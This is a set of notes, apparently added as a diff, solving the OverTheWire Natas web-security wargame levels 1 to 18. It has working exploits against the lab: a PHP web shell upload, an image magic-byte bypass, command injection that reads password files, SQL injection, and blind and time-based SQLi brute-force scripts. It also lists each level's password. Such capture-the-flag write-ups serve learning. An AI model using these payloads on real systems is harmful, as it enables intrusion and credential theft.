@@ -1,0 +1,254 @@
+* natas1
+  gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+* natas2
+  ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+* natas3
+  query /files and there is a file called users.txt
+  sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+* natas4
+  look at the robots.txt file
+  Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+* natas5
+  change the referer field
+  iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 
+
+* natas6
+  change the log in cookie to 1
+  aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+* natas7
+  - *array_key_exists("submit", $_POST)* checks whether the key "submit" is in the associative array $_POST (associative arrays are these with keys).
+  - *$_POST$* holds the variables passed to the script with the POST method.
+
+  The script includes a file includes/secret.inc, which is accessible and contains the secret.
+  7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+* natas7
+  pass the path /etc/natas_webpass/natas7 as a parameter to the php file
+  DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
+
+* natas8
+  We have to invert the function bin2hex(strrev(base64_encode(..)))
+#+BEGIN_SRC python
+inp = "3d3d516343746d4d6d6c315669563362"
+rev = ''.join([inp[2*i:2*(i+1)] for i in range(len(inp)//2)][::-1])
+byt = bytearray.fromhex(rev)
+import base64
+secret = base64.b64decode(byt).decode()
+#+END_SRC
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+* natas9
+- $_REQUEST: An associative array that by default contains the contents of $_GET, $_POST and $_COOKIE
+query *a /etc/natas_webpass/natas10 ;*
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+* natas10
+same as before except we cannot use ';', we simply drop it as the grep command accepts two files as input.
+This time we look for 'c', not 'a' (trial and error)
+*c /etc/natas_webpass/natas11*
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+* natas11
+- The goal is to make $data["showpassword"] == "yes".
+- $data is first loaded as default data, which has showpassword set to no.
+- When the data is loaded, the cookie 'data' is read and xor_decrypted
+- We have the change the cookie so that when it is decrypted we get showpassword=yes. We do this using the fact that we can get the key from the plaintext/ciphertext pair.
+- The plaintext looks like {"showpassword":"no","bgcolor":"#ffffff:}
+
+The following python script decodes the cookie
+#+BEGIN_SRC python
+cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw="
+ciphertext = base64.b64decode(cookie)
+plaintext = b'{"showpassword":"no","bgcolor":"#ffffff"}'
+
+assert len(ciphertext) == len(plaintext)
+keys = b''.join([bytes([ciphertext[i]^plaintext[i]]) for i in range(len(ciphertext))])
+print(keys)
+
+# from the above we obtain that
+key = b'qw8J'
+new_plaintext = b'{"showpassword":"yes","bgcolor":"#ffffff"}'
+new_ciphertext = b''.join([bytes([new_plaintext[i]^key[i % len(key)]]) for i in range(len(new_plaintext))])
+new_cookie = base64.b64encode(new_ciphertext)
+print(new_cookie.decode())
+# ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+#+END_SRC
+
+EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+* natas12
+- *move_uploaded_file* This function checks to ensure that the file designated by filename is a valid upload file (meaning that it was uploaded via PHP's HTTP POST upload mechanism). If the file is valid, it will be moved to the filename given by destination. 
+- The php program crates a folder in /upload/RANDOM_DIR/filename and puts the uploaded file there
+  + The file gets a random name with extension .jpg, but this is set at the client side so we can override this to set any file extension we want (The filename gets changed at serverside though)
+  + The goal is then to upload a php script that reads the key we want
+
+#+BEGIN_SRC html
+<html>
+<?php
+passthru("cat /etc/natas_webpass/natas13");
+?>
+</html>
+#+END_SRC
+
+- The extension must be .php so that the server runs it as a php script
+- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+* natas13
+Now we have the function *exif_imagetype* that checks the first few bytes of the uploaded file to check if it is an image
+- The signature of a gif file is 47 49 46 38 37 61 (in hex)
+- The signature of a png file is 89 50 4E 47 0D 0A 1A 0A
+- The signature of a bitmap (.bmp) file is 42 4D (BM in ASCII)
+#+BEGIN_SRC bash
+printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<html><?php passthru("cat /etc/natas_webpass/natas14");?></html>' > natas14.php
+#+END_SRC
+
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+* natas14
+Command line command:
+u="\" or \"\"=\""; p="\" or \"\"=\""; curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 http://natas14.natas.labs.overthewire.org/index.php?debug=1 -d "username=$u" -d "password=$p"
+
+The resulting query is:
+SELECT * from users where username="" or ""="" and password="" or ""=""
+
+The reason why we use this and not 1=1 is because there is a " at the end of username, which we need to match with something.
+
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+* natas15
+We can do sql injection again, but this time we will only get informed about the existence of a specific user. What we do is that we try to guess the password of natas16 "bit by bit"
+
+The basic script looks like this:
+u="natas16\" and password like \"%"; curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/index.php?debug=1 -d "username=$u"
+
+We can modify the prefix. 
+One issue is that the sql query is case insensitive. 
+To fix this we extract the prefix with the SUBSTRING function and we use the BINARY keyword that makes the comparison case-sensitive (https://www.tutorialspoint.com/how-to-make-sql-case-sensitive-string-comparison-in-mysql)
+
+#+BEGIN_SRC python
+import requests, string
+alphabet = string.ascii_letters + string.digits # alphabet of characters to try out
+
+password = ""
+done=0
+pos=1 # position of the password we're looking at
+
+while done==0:
+    done=1
+    for ch in alphabet:
+        # The sql query looks for user natas16, where the password's first "pos" positions are the string we've guessed so far.
+        inj= f'natas16\" and BINARY SUBSTRING(password,1,{pos}) = \"{password}{ch}' 
+        payload = {'username':inj}
+        r = requests.post(url = "http://natas15.natas.labs.overthewire.org/index.php", auth=('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), params={'debug':'1'}, data=payload)   
+        if 'doesn\'t' not in r.text:
+            password += ch
+            print(password)
+            done = 0
+            pos +=1
+            break
+#+END_SRC
+
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+* natas16
+
+Idea: We can query $(...). Perhaps we can write $(if ith char of password is X then print a, else print 1). 'a' will match the dictionary whereas '1' won't.
+
+We use grep. We query the word "befalling". 
+
+> befalling$(grep ^a /etc/natas_webpass/natas17)
+
+If the password begins with 'a', it will return "befallinga", which is not in the dictionary. Else, it will return "befalling", which is in the dictionary.
+
+#+BEGIN_SRC python
+import requests, string
+alphabet = string.ascii_letters + string.digits # alphabet of characters to try out
+
+password = ""
+done=0
+pos=1 # position of the password we're looking at
+
+while done==0:
+    done=1
+    for ch in alphabet:
+        #print(f"Trying ch = {ch}")
+        data= f'befalling$(grep ^{password+ch} /etc/natas_webpass/natas17)'
+        r = requests.get(url = f"http://natas16.natas.labs.overthewire.org/", auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), params={'needle':data, 'submit':'Search'})
+        if 'befalling' not in r.text:
+            password += ch
+            print(password)
+            done = 0
+            pos +=1
+            break
+print("Done!")
+#+END_SRC
+
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+* natas17
+
+The idea here is to use the sql SLEEP command, which will cause the
+query to sleep for some time. We will perform multiple queries trying
+to guess each character of the password, and if there is a match, we
+will ask SQL to sleep 5 seconds. This allows us to distinguish matches
+from non-matches
+
+Basic idea:
+
+u='natas18" and BINARY SUBSTRING(password,1,1) = "g" and sleep(5) and ""="';
+curl -u natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw http://natas17.natas.labs.overthewire.org/index.php?debug=1 -d "username=$u"
+
+sleep(5) only gets called if the first two statements result in something.
+
+#+BEGIN_SRC python
+import requests, string
+from datetime import timedelta
+alphabet = string.ascii_letters + string.digits # alphabet of characters to try out
+
+password = ""
+done=0
+pos=1 # position of the password we're looking at
+
+def test_username(username, iter=1):
+    r = requests.get(url = f"http://natas17.natas.labs.overthewire.org/index.php?debug=1", auth=('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), params={'username':username})
+    
+    req = [requests.get(url = f"http://natas17.natas.labs.overthewire.org/index.php?debug=1", auth=('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), params={'username':username}).elapsed for _ in range(iter)]
+    
+    summ = timedelta(0)
+    for r in req:
+        summ += r
+    avg = summ/iter
+
+    return avg
+
+while done==0:
+    done=1
+    for ch in alphabet:
+        print(f'Testing {ch}')
+        data = f'natas18" and BINARY SUBSTRING(password,1,{pos}) = "{password+ch}" and sleep(5) and ""="'
+        if test_username(data) >= timedelta(seconds=5):
+            password += ch
+            print(password)
+            done = 0
+            pos += 1
+            break
+#+END_SRC
+
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
+* natas18
+
+u='test'; p='ptest'; curl -u natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP http://natas18.natas.labs.overthewire.org/index.php?debug=1 -d "username=$u" -d "password=$p" --cookie PHPSESSID=16
+
+We have to find the session ID that was used for the admin. This can be easily bruteforced. Also, try burpsuite!
+
+Correct cookie: 119
+
+4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
